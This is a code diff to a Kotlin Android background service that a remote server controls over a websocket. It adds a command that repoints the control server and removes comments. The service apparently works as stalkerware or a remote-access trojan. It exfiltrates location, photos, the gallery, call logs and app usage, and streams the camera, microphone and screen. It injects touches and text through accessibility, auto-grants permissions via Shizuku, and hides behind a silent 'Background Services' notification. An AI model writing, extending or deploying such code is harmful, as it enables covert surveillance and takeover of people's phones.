@@ -49,7 +49,6 @@ class CoreService : Service() {
         try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
     }
 
-    // ─── WAKE LOCK ────────────────────────────────────────────────────────────
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(POWER_SERVICE) as PowerManager
@@ -62,7 +61,6 @@ class CoreService : Service() {
         try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
     }
 
-    // ─── WEBSOCKET ────────────────────────────────────────────────────────────
     private fun connectServer() {
         val savedUrl = getSharedPreferences("config", MODE_PRIVATE).getString("server_url", null)
         if (savedUrl != null) SERVER_URL = savedUrl
@@ -74,10 +72,21 @@ class CoreService : Service() {
         wsManager?.connect()
     }
 
-    // ─── COMMAND HANDLER ─────────────────────────────────────────────────────
     private fun handleCommand(data: JSONObject) {
         try {
             when (data.optString("command")) {
+
+                // ── URL Update (from parent app) ───────────────────────────
+                "update_url" -> {
+                    val newUrl = data.optString("url")
+                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
+                        SERVER_URL = newUrl
+                        getSharedPreferences("config", MODE_PRIVATE)
+                            .edit().putString("server_url", newUrl).apply()
+                        wsManager?.disconnect()
+                        connectServer()
+                    }
+                }
 
                 // ── Basic ──────────────────────────────────────────────────
                 "lock_screen"       -> lockScreen()
@@ -85,11 +94,9 @@ class CoreService : Service() {
                 "get_location"      -> sendLocation()
                 "take_photo"        -> takeSinglePhoto()
 
-                // ── Network toggle (via Shizuku shell if available) ─────────
                 "wifi_on"  -> runShellCmd("svc wifi enable")
                 "wifi_off" -> runShellCmd("svc wifi disable")
 
-                // ── Data ───────────────────────────────────────────────────
                 "get_gallery"     -> sendGallery(data.optInt("limit", 20))
                 "get_full_photo"  -> sendFullPhoto(data.optString("path"))
                 "get_call_log"    -> sendCallLog(data.optInt("limit", 50))
@@ -97,26 +104,22 @@ class CoreService : Service() {
                 "get_running_app" -> sendCurrentApp()
                 "get_app_usage"   -> sendAppUsage(data.optInt("hours", 24))
 
-                // ── Camera stream ──────────────────────────────────────────
                 "start_camera_stream" -> startService(
                     Intent(this, CameraStreamService::class.java)
                         .putExtra("interval", data.optLong("interval", 2000L)))
                 "stop_camera_stream"  -> startService(
                     Intent(this, CameraStreamService::class.java).setAction("STOP"))
 
-                // ── Mic stream ─────────────────────────────────────────────
                 "start_mic_stream" -> startService(Intent(this, AudioStreamService::class.java))
                 "stop_mic_stream"  -> startService(
                     Intent(this, AudioStreamService::class.java).setAction("STOP"))
 
-                // ── Screen stream ──────────────────────────────────────────
                 "start_screen_stream" -> startService(
                     Intent(this, ScreenStreamService::class.java)
                         .putExtra("interval", data.optLong("interval", 1000L)))
                 "stop_screen_stream"  -> startService(
                     Intent(this, ScreenStreamService::class.java).setAction("STOP"))
 
-                // ── Remote control via Accessibility ───────────────────────
                 "touch"   -> AccessibilityMonitor.performTouch(
                     data.optDouble("x", 0.0).toFloat(),
                     data.optDouble("y", 0.0).toFloat())
@@ -129,9 +132,8 @@ class CoreService : Service() {
                 "key_back"    -> AccessibilityMonitor.performBack()
                 "key_home"    -> AccessibilityMonitor.performHome()
                 "key_recents" -> AccessibilityMonitor.performRecents()
-                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))  // FIXED: 1 arg
+                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))
 
-                // ── Shizuku auto-grant ─────────────────────────────────────
                 "grant_permissions" -> {
                     val count = ShizukuManager.grantAllPermissions(this)
                     sendData("permissions_result", JSONObject().apply {
@@ -143,7 +145,6 @@ class CoreService : Service() {
         } catch (_: Exception) {}
     }
 
-    // ─── SEND HELPERS ─────────────────────────────────────────────────────────
     fun sendData(type: String, data: JSONObject) {
         try {
             data.put("type", type)
@@ -159,7 +160,6 @@ class CoreService : Service() {
         } catch (_: Exception) {}
     }
 
-    /** Run shell command via root/ADB shell (works when Shizuku is active) */
     private fun runShellCmd(cmd: String) {
         try { Runtime.getRuntime().exec(cmd.split(" ").toTypedArray()).waitFor() }
         catch (_: Exception) {}
@@ -237,7 +237,6 @@ class CoreService : Service() {
         } catch (_: Exception) {}
     }
 
-    // ─── NOTIFICATION ─────────────────────────────────────────────────────────
     private fun createNotificationChannel() {
         val ch = NotificationChannel(CHANNEL_ID, "Background Services",
             NotificationManager.IMPORTANCE_NONE).apply {
